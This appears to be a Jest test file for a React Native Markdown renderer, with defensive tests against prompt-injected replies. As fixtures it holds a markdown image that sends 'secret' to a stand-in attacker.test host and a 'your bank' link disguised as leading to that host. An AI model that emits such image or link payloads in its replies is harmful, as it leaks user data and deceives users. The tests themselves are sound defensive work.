import React from 'react';
import { Linking } from 'react-native';
import { fireEvent, render } from '@testing-library/react-native';

jest.mock('../../theme/ThemeContext', () => ({ useTheme: jest.fn() }));
import { useTheme } from '../../theme/ThemeContext';
import { lightColors } from '../../theme/colors';
import { Markdown } from '../Markdown';

const mockedUseTheme = jest.mocked(useTheme);

describe('Markdown', () => {
  beforeEach(() => {
    mockedUseTheme.mockReturnValue({
      mode: 'light',
      resolvedScheme: 'light',
      colors: lightColors,
      setMode: jest.fn(),
    } as never);
  });

  it('renders bold text from markdown', async () => {
    const { getByText } = await render(<Markdown content="**bold**" />);
    expect(getByText('bold')).toBeTruthy();
  });

  it('renders a bullet list', async () => {
    const { getByText } = await render(<Markdown content={'- one\n- two'} />);
    expect(getByText('one')).toBeTruthy();
    expect(getByText('two')).toBeTruthy();
  });

  it('renders plain paragraph text', async () => {
    const { getByText } = await render(<Markdown content="Hello there" />);
    expect(getByText('Hello there')).toBeTruthy();
  });

  it('renders inline code constrained to the body line box', async () => {
    const { getByText } = await render(<Markdown content="Status is `pending`" />);
    const node = getByText('pending');
    expect(node).toBeTruthy();
    const flatStyle = Object.assign({}, ...[node.props.style].flat());
    expect(flatStyle.fontSize).toBeLessThan(15);
    expect(flatStyle.lineHeight).toBe(20);
  });

  it('renders a fenced code block', async () => {
    const { getByText } = await render(<Markdown content={'```\nconst x = 1;\n```'} />);
    expect(getByText('const x = 1;')).toBeTruthy();
  });

  // JEF-464: a prompt-injected reply must not leak data through an image the
  // app loads by itself, or open a non-web URL from a link.
  describe('untrusted URLs', () => {
    let openURL: jest.SpyInstance;

    beforeEach(() => {
      openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true);
    });

    afterEach(() => {
      openURL.mockRestore();
    });

    it('renders an image as its alt text, with no Image to fetch it', async () => {
      const { getByText, toJSON } = await render(
        <Markdown content="See ![chart](https://attacker.test/p.png?d=secret) here" />,
      );
      expect(getByText('[chart]')).toBeTruthy();
      const tree = JSON.stringify(toJSON());
      expect(tree).not.toContain('"type":"Image"');
      expect(tree).not.toContain('attacker.test');
    });

    it('opens an https link and shows the host it goes to', async () => {
      const { getByText } = await render(
        <Markdown content="[your bank](https://attacker.test/login?d=1)" />,
      );
      expect(getByText('(attacker.test)', { exact: false })).toBeTruthy();
      fireEvent.press(getByText('your bank'));
      expect(openURL).toHaveBeenCalledWith('https://attacker.test/login?d=1');
    });

    it('does not repeat the host when the label already names it', async () => {
      const { queryByText } = await render(
        <Markdown content="[example.com/jobs](https://www.example.com/jobs)" />,
      );
      expect(queryByText(/\(.*\)/)).toBeNull();
    });

    it.each(['tel:+15550100', 'intent://scan#Intent;end', 'trakwyn://settings'])(
      'does not open %s',
      async (href) => {
        const { getByText } = await render(<Markdown content={`[click](${href})`} />);
        fireEvent.press(getByText('click'));
        expect(openURL).not.toHaveBeenCalled();
      },
    );

    it('opens a mailto link without a host suffix', async () => {
      const { getByText, queryByText } = await render(
        <Markdown content="[email me](mailto:hr@example.com)" />,
      );
      expect(queryByText(/\(.*\)/)).toBeNull();
      fireEvent.press(getByText('email me'));
      expect(openURL).toHaveBeenCalledWith('mailto:hr@example.com');
    });
  });
});
